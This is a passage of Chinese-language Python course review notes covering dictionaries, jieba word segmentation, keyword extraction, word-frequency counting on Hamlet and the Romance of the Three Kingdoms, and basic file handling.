<h3 id="字典类型的用法"><a href="#字典类型的用法" class="headerlink" title="字典类型的用法"></a>字典类型的用法</h3><p>在字典变量中，通过键获得值</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2095.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">&quot;中国&quot;</span>:<span class="string">&quot;北京&quot;</span>, <span class="string">&quot;美国&quot;</span>:<span class="string">&quot;华盛顿&quot;</span>, <span class="string">&quot;法国&quot;</span>:<span class="string">&quot;巴黎&quot;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d </span><br><span class="line">&#123;<span class="string">&#x27;中国&#x27;</span>: <span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;美国&#x27;</span>: <span class="string">&#x27;华盛顿&#x27;</span>, <span class="string">&#x27;法国&#x27;</span>: <span class="string">&#x27;巴黎&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">&quot;中国&quot;</span>]</span><br><span class="line"><span class="string">&#x27;北京&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>de = &#123;&#125; ; <span class="built_in">type</span>(de) <span class="comment">#type(x)：返回变量x的类型</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="字典处理函数及方法"><a href="#字典处理函数及方法" class="headerlink" title="字典处理函数及方法"></a>字典处理函数及方法</h3><p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2096.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">&quot;中国&quot;</span>:<span class="string">&quot;北京&quot;</span>, <span class="string">&quot;美国&quot;</span>:<span class="string">&quot;华盛顿&quot;</span>, <span class="string">&quot;法国&quot;</span>:<span class="string">&quot;巴黎&quot;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;中国&quot;</span> <span class="keyword">in</span> d </span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.keys()</span><br><span class="line">dict_keys([<span class="string">&#x27;中国&#x27;</span>, <span class="string">&#x27;美国&#x27;</span>, <span class="string">&#x27;法国&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.values()</span><br><span class="line">dict_values([<span class="string">&#x27;北京&#x27;</span>, <span class="string">&#x27;华盛顿&#x27;</span>, <span class="string">&#x27;巴黎&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2097.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = &#123;<span class="string">&quot;中国&quot;</span>:<span class="string">&quot;北京&quot;</span>, <span class="string">&quot;美国&quot;</span>:<span class="string">&quot;华盛顿&quot;</span>, <span class="string">&quot;法国&quot;</span>:<span class="string">&quot;巴黎&quot;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.get(<span class="string">&quot;中国&quot;</span>,<span class="string">&quot;伊斯兰堡&quot;</span>)</span><br><span class="line"><span class="string">&#x27;北京&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.get(<span class="string">&quot;巴基斯坦&quot;</span>,<span class="string">&quot;伊斯兰堡&quot;</span>)</span><br><span class="line"><span class="string">&#x27;伊斯兰堡&#x27;</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.popitem()</span><br><span class="line">(<span class="string">&#x27;美国&#x27;</span>, <span class="string">&#x27;华盛顿&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>*<strong>字典功能默写</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2098.png" alt="image.png"></p>
<p>*<strong>字典类型应用场景</strong></p>
<p><strong>（1）映射的表达</strong></p>
<p>映射无处不在，键值对无处不在</p>
<p>例如：统计数据出现的次数，数据是键，次数是值</p>
<p>最主要作用：表达键值对数据，进而操作它们</p>
<p><strong>（2）元素遍历</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2099.png" alt="image.png"></p>
<p><strong>（3）统计某个特征的数量、构建树形结构、配置文件</strong></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20100.png" alt="image.png"></p>
<h2 id="jieba库的使用"><a href="#jieba库的使用" class="headerlink" title="jieba库的使用"></a>jieba库的使用</h2><h3 id="分词"><a href="#分词" class="headerlink" title="分词"></a>分词</h3><p>分词的目的，就是把中文文本按照词语切分开</p>
<p>（1）基于规则的分词</p>
<p>正向最大匹配（FMM）：南京市长江大桥</p>
<p>逆向最大匹配（RMM）：研究生命的起源</p>
<p>双向最大匹配：结婚的和尚未结婚的</p>
<p>（2）基于统计额分词：基于N-Gram模型的分词</p>
<p>（3）基于深度学习的分词：序列标注任务</p>
<p>（4）混合方法：多种方法一起用</p>
<p><strong>jieba是Python中一个重要的第三方中文分词函数库，jieba库是第三方库，不是安装包自带，需要通过pip指令安装。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> jieba</span><br><span class="line">&gt;&gt;&gt;jieba.lcut(<span class="string">&quot;中国是一个伟大的国家&quot;</span>)</span><br><span class="line">[<span class="string">&#x27;中国&#x27;</span>, <span class="string">&#x27;是&#x27;</span>, <span class="string">&#x27;一个&#x27;</span>, <span class="string">&#x27;伟大&#x27;</span>, <span class="string">&#x27;的&#x27;</span>, <span class="string">&#x27;国家&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="jieba库的解析"><a href="#jieba库的解析" class="headerlink" title="jieba库的解析"></a>jieba库的解析</h3><p>分词冗余度：全模式  &gt;  搜索引擎模式  &gt;  精确模式</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20101.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> jieba</span><br><span class="line">&gt;&gt;&gt;jieba.lcut(<span class="string">&quot;中华人民共和国是一个伟大的国家&quot;</span>)</span><br><span class="line">[<span class="string">&#x27;中华人民共和国&#x27;</span>, <span class="string">&#x27;是&#x27;</span>, <span class="string">&#x27;一个&#x27;</span>, <span class="string">&#x27;伟大&#x27;</span>, <span class="string">&#x27;的&#x27;</span>, <span class="string">&#x27;国家&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;jieba.lcut(<span class="string">&quot;中华人民共和国是一个伟大的国家&quot;</span>, cut_all=<span class="literal">True</span>)</span><br><span class="line">[<span class="string">&#x27;中华&#x27;</span>, <span class="string">&#x27;中华人民&#x27;</span>, <span class="string">&#x27;中华人民共和国&#x27;</span>, <span class="string">&#x27;华人&#x27;</span>, <span class="string">&#x27;人民&#x27;</span>, <span class="string">&#x27;人民共和国&#x27;</span>, <span class="string">&#x27;共和&#x27;</span>, <span class="string">&#x27;共和国&#x27;</span>, <span class="string">&#x27;国是&#x27;</span>, <span class="string">&#x27;一个&#x27;</span>, <span class="string">&#x27;伟大&#x27;</span>, <span class="string">&#x27;的&#x27;</span>, <span class="string">&#x27;国家&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;jieba.lcut_for_search(<span class="string">&quot;中华人民共和国是一个伟大的国家&quot;</span>)</span><br><span class="line">[<span class="string">&#x27;中华&#x27;</span>, <span class="string">&#x27;华人&#x27;</span>, <span class="string">&#x27;人民&#x27;</span>, <span class="string">&#x27;共和&#x27;</span>, <span class="string">&#x27;共和国&#x27;</span>, <span class="string">&#x27;中华人民共和国&#x27;</span>, <span class="string">&#x27;是&#x27;</span>, <span class="string">&#x27;一个&#x27;</span>, <span class="string">&#x27;伟大&#x27;</span>, <span class="string">&#x27;的&#x27;</span>, <span class="string">&#x27;国家&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="关键词提取"><a href="#关键词提取" class="headerlink" title="关键词提取"></a>关键词提取</h3><p>（1）TF-IDF算法</p>
<p><strong>TF(term frequency)为词频</strong>，指给定单词在文档中出现的频率。</p>
<p><strong>IDF(inverse document frequency)为倒文档词频</strong>，表示包含给定单词的文档数量的倒数</p>
<p>TF与IDF的乘积是单词与文档之间相关性的一种有效度量</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20102.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20103.png" alt="image.png"></p>
<p>基于TF-IDF算法</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20104.png" alt="image.png"></p>
<p>（2）TextRank算法</p>
<p>TextRank是一种图排序算法，基于PageRank的思想，将文本中的词语看作图中的节点，通过词语共现关系构建边，迭代计算节点权重（重要性）。</p>
<p>关键词提取：将句子中的词语作为节点，用窗口内共现关系构建边，权重由共现次数决定。</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20105.png" alt="image.png"></p>
<p>基于TextRank算法</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20106.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"></span><br><span class="line"><span class="comment">#读文本文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_text</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        text = f.read()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="comment">#提取n-gram</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ngrams</span>(<span class="params">text,n=<span class="number">2</span></span>):</span><br><span class="line">    words = [ word <span class="keyword">for</span> word <span class="keyword">in</span> jieba.lcut(text) <span class="keyword">if</span> <span class="built_in">len</span>(word) &gt; <span class="number">1</span>] <span class="comment">#分词</span></span><br><span class="line">    words = [ item <span class="keyword">for</span> item <span class="keyword">in</span> words <span class="keyword">if</span> item !=<span class="string">&quot; &quot;</span>] <span class="comment">#去除空格</span></span><br><span class="line">    ngrams = <span class="built_in">zip</span>(*[words[i:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]) <span class="comment">#生成n-gram</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;&#x27;</span>.join(ngram) <span class="keyword">for</span> ngram <span class="keyword">in</span> ngrams] <span class="comment">#返回n-gram列表</span></span><br></pre></td></tr></table></figure>

<h3 id="文本词频统计"><a href="#文本词频统计" class="headerlink" title="文本词频统计"></a>文本词频统计</h3><p>需求：一篇文章，出现了哪些词？哪些词出现得最多？该怎么做呢？</p>
<p>英文文本：<em>Hamet</em> 分析词频</p>
<p><a href="https://python123.io/resources/pye/hamlet.txt">https://python123.io/resources/pye/hamlet.txt</a></p>
<p>中文文本：《三国演义》分析人物</p>
<p><a href="https://python123.io/resources/pye/threekingdoms.txt">https://python123.io/resources/pye/threekingdoms.txt</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#CalHamletV1.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getText</span>():</span><br><span class="line">    txt = <span class="built_in">open</span>(<span class="string">&quot;hamlet.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    txt = txt.lower()</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">&#x27;!&quot;#$%&amp;()*+,-./:;&lt;=&gt;?@[\\]^_‘&#123;|&#125;~&#x27;</span>:</span><br><span class="line">        txt = txt.replace(ch, <span class="string">&quot; &quot;</span>) </span><br><span class="line">    <span class="keyword">return</span> txt</span><br><span class="line"></span><br><span class="line">hamletTxt = getText()</span><br><span class="line">words  = hamletTxt.split()</span><br><span class="line">counts = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> words:			</span><br><span class="line">    counts[word] = counts.get(word,<span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">items = <span class="built_in">list</span>(counts.items())</span><br><span class="line">items.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>], reverse=<span class="literal">True</span>) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    word, count = items[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;</span>.<span class="built_in">format</span>(word, count))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">the        <span class="number">1138</span></span><br><span class="line"><span class="keyword">and</span>         <span class="number">965</span></span><br><span class="line">to          <span class="number">754</span></span><br><span class="line">of          <span class="number">669</span></span><br><span class="line">you         <span class="number">550</span></span><br><span class="line">a           <span class="number">542</span></span><br><span class="line">i           <span class="number">542</span></span><br><span class="line">my          <span class="number">514</span></span><br><span class="line">hamlet      <span class="number">462</span></span><br><span class="line"><span class="keyword">in</span>          <span class="number">436</span></span><br></pre></td></tr></table></figure>

<p>文本去噪及归一化，使用字典表达词频。</p>
<p><strong>sort方法，列表排序。key参数指定排序关键字。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e10.2CalHamlet.py</span></span><br><span class="line">excludes = &#123;<span class="string">&quot;the&quot;</span>,<span class="string">&quot;and&quot;</span>,<span class="string">&quot;of&quot;</span>,<span class="string">&quot;you&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;my&quot;</span>,<span class="string">&quot;in&quot;</span>&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getText</span>():</span><br><span class="line">    txt = <span class="built_in">open</span>(<span class="string">&quot;hamlet.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    txt = txt.lower()</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">&#x27;!&quot;#$%&amp;()*+,-./:;&lt;=&gt;?@[\\]^_‘&#123;|&#125;~&#x27;</span>:</span><br><span class="line">        txt = txt.replace(ch, <span class="string">&quot; &quot;</span>)   <span class="comment">#将文本中特殊字符替换为空格</span></span><br><span class="line">    <span class="keyword">return</span> txt</span><br><span class="line">hamletTxt = getText()</span><br><span class="line">words  = hamletTxt.split()</span><br><span class="line">counts = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">    counts[word] = counts.get(word,<span class="number">0</span>) + <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> excludes:</span><br><span class="line">    <span class="keyword">del</span> counts[word]</span><br><span class="line">items = <span class="built_in">list</span>(counts.items())</span><br><span class="line">items.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>], reverse=<span class="literal">True</span>) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    word, count = items[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;</span>.<span class="built_in">format</span>(word, count))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">to          <span class="number">754</span></span><br><span class="line">hamlet      <span class="number">462</span></span><br><span class="line">it          <span class="number">416</span></span><br><span class="line">that        <span class="number">391</span></span><br><span class="line"><span class="keyword">is</span>          <span class="number">340</span></span><br><span class="line"><span class="keyword">not</span>         <span class="number">314</span></span><br><span class="line">lord        <span class="number">309</span></span><br><span class="line">his         <span class="number">296</span></span><br><span class="line">this        <span class="number">295</span></span><br><span class="line">but         <span class="number">269</span></span><br></pre></td></tr></table></figure>

<p>《三国演艺》人物出现次数统计</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#CalThreeKingdomsV1.py</span></span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">txt = <span class="built_in">open</span>(<span class="string">&quot;threekingdoms.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>).read()</span><br><span class="line">words = jieba.lcut(txt)</span><br><span class="line">counts = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(word) == <span class="number">1</span>: <span class="comment">#把单字去掉，古文中2字及以上的大概率是人名</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:			</span><br><span class="line">        counts[word] = counts.get(word,<span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">items = <span class="built_in">list</span>(counts.items())</span><br><span class="line">items.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>], reverse=<span class="literal">True</span>) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    word, count = items[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;</span>.<span class="built_in">format</span>(word, count))</span><br><span class="line">    </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line">曹操          <span class="number">953</span></span><br><span class="line">孔明          <span class="number">836</span></span><br><span class="line">将军          <span class="number">772</span></span><br><span class="line">却说          <span class="number">656</span></span><br><span class="line">玄德          <span class="number">585</span></span><br><span class="line">关公          <span class="number">510</span></span><br><span class="line">丞相          <span class="number">491</span></span><br><span class="line">二人          <span class="number">469</span></span><br><span class="line">不可          <span class="number">440</span></span><br><span class="line">荆州          <span class="number">425</span></span><br><span class="line">玄德曰         <span class="number">390</span></span><br><span class="line">孔明曰         <span class="number">390</span></span><br><span class="line">不能          <span class="number">384</span></span><br><span class="line">如此          <span class="number">378</span></span><br><span class="line">张飞          <span class="number">358</span></span><br></pre></td></tr></table></figure>

<p>观察输出结果，同一个人物会有不同的名字，这种情况需要整合处理。同时，与英文词频统计类似，需要排除一些人名无关词汇，如“却说”、“将军”等。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e10.4CalThreeKingdoms.py</span></span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">excludes = &#123;<span class="string">&quot;将军&quot;</span>,<span class="string">&quot;却说&quot;</span>,<span class="string">&quot;荆州&quot;</span>,<span class="string">&quot;二人&quot;</span>,<span class="string">&quot;不可&quot;</span>,<span class="string">&quot;不能&quot;</span>,<span class="string">&quot;如此&quot;</span>&#125;</span><br><span class="line">txt = <span class="built_in">open</span>(<span class="string">&quot;三国演义.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>).read()</span><br><span class="line">words  = jieba.lcut(txt)</span><br><span class="line">counts = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(word) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> word == <span class="string">&quot;诸葛亮&quot;</span> <span class="keyword">or</span> word == <span class="string">&quot;孔明曰&quot;</span>:</span><br><span class="line">        rword = <span class="string">&quot;孔明&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> word == <span class="string">&quot;关公&quot;</span> <span class="keyword">or</span> word == <span class="string">&quot;云长&quot;</span>:</span><br><span class="line">        rword = <span class="string">&quot;关羽&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> word == <span class="string">&quot;玄德&quot;</span> <span class="keyword">or</span> word == <span class="string">&quot;玄德曰&quot;</span>:</span><br><span class="line">        rword = <span class="string">&quot;刘备&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> word == <span class="string">&quot;孟德&quot;</span> <span class="keyword">or</span> word == <span class="string">&quot;丞相&quot;</span>:</span><br><span class="line">        rword = <span class="string">&quot;曹操”</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        rword = word</span></span><br><span class="line"><span class="string">    counts[rword] = counts.get(rword,0) + 1</span></span><br><span class="line"><span class="string">for word in excludes:</span></span><br><span class="line"><span class="string">    del(counts[word])</span></span><br><span class="line"><span class="string">items = list(counts.items())</span></span><br><span class="line"><span class="string">items.sort(key=lambda x:x[1], reverse=True) </span></span><br><span class="line"><span class="string">for i in range(5):</span></span><br><span class="line"><span class="string">    word, count = items[i]</span></span><br><span class="line"><span class="string">    print(&quot;</span>&#123;<span class="number">0</span>:&lt;<span class="number">10</span>&#125;&#123;<span class="number">1</span>:&gt;<span class="number">5</span>&#125;<span class="string">&quot;.format(word, count))</span></span><br></pre></td></tr></table></figure>

<p>输出排序前5的单词，运行程序后，输出结果如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; </span><br><span class="line">曹操         <span class="number">1451</span></span><br><span class="line">孔明         <span class="number">1383</span></span><br><span class="line">刘备         <span class="number">1252</span></span><br><span class="line">关羽          <span class="number">784</span></span><br><span class="line">张飞          <span class="number">358</span></span><br></pre></td></tr></table></figure>

<h1 id="文件和数据格式化"><a href="#文件和数据格式化" class="headerlink" title="文件和数据格式化"></a>文件和数据格式化</h1><h2 id="文件的使用"><a href="#文件的使用" class="headerlink" title="文件的使用"></a>文件的使用</h2><h3 id="文件的理解"><a href="#文件的理解" class="headerlink" title="文件的理解"></a>文件的理解</h3><p>（1）文件是数据的抽象和集合：文件是存储在辅助存储器上的数据序列、文件是数据存储的一种形式、文件展现形态：文本文件和二进制文件</p>
<p>（2）文本文件 vs. 二进制文件：文件文件和二进制文件只是文件的展示方式、本质上，所有文件都是二进制形式存储、形式上，所有文件采用两种方式展示</p>
<p>（3）文件是数据的抽象和集合：由单一特定编码组成的文件，如UTF-8编码、由于存在编码，也被看成是存储着的长字符串、适用于例如：.txt文件、.py文件等、直接由比特0和1组成，没有统一字符编码、一般存在二进制0和1的组织结构，即文件格式、适用于例如：.png文件、.avi文件等</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#f.txt文件保存: 中国是个伟大的国家！</span></span><br><span class="line"><span class="comment">#文本形式打开文件</span></span><br><span class="line">tf = <span class="built_in">open</span>(<span class="string">&quot;f.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(tf.readline())</span><br><span class="line">tf.close()</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">中国是个伟大的国家!</span><br><span class="line"></span><br><span class="line"><span class="comment">#二进制形式打开文件</span></span><br><span class="line">bf = <span class="built_in">open</span>(<span class="string">&quot;f.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(bf.readline())</span><br><span class="line">bf.close()</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad\xe5\x9b\xbd\xe6\x98\xaf\xe4\xb8\xaa\xe4\xbc\x9f\xe5\xa4\xa7\xe7\x9a\x84\xe5\x9b\xbd\xe5\xae\xb6\xef\xbc\x81&#x27;</span></span><br><span class="line">(UTF-<span class="number">8</span>编码，每个中文为<span class="number">3</span>字节)</span><br></pre></td></tr></table></figure>

<h3 id="文件的打开关闭"><a href="#文件的打开关闭" class="headerlink" title="文件的打开关闭"></a>文件的打开关闭</h3><p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20107.png" alt="image.png"></p>
<p>文件的打开</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20108.png" alt="image.png"></p>
<p>文件路径</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20109.png" alt="image.png"></p>
<p>打开模式</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20110.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20111.png" alt="image.png"></p>
<p>文件的关闭</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20112.png" alt="image.png"></p>
<h2 id="文件内容的读取"><a href="#文件内容的读取" class="headerlink" title="文件内容的读取"></a>文件内容的读取</h2><h3 id="文件内容的读取-1"><a href="#文件内容的读取-1" class="headerlink" title="文件内容的读取"></a>文件内容的读取</h3><p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20113.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20114.png" alt="image.png"></p>
<h3 id="文件的全文本操作"><a href="#文件的全文本操作" class="headerlink" title="文件的全文本操作"></a>文件的全文本操作</h3><p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20115.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%20116.png" alt="image.png"></p>
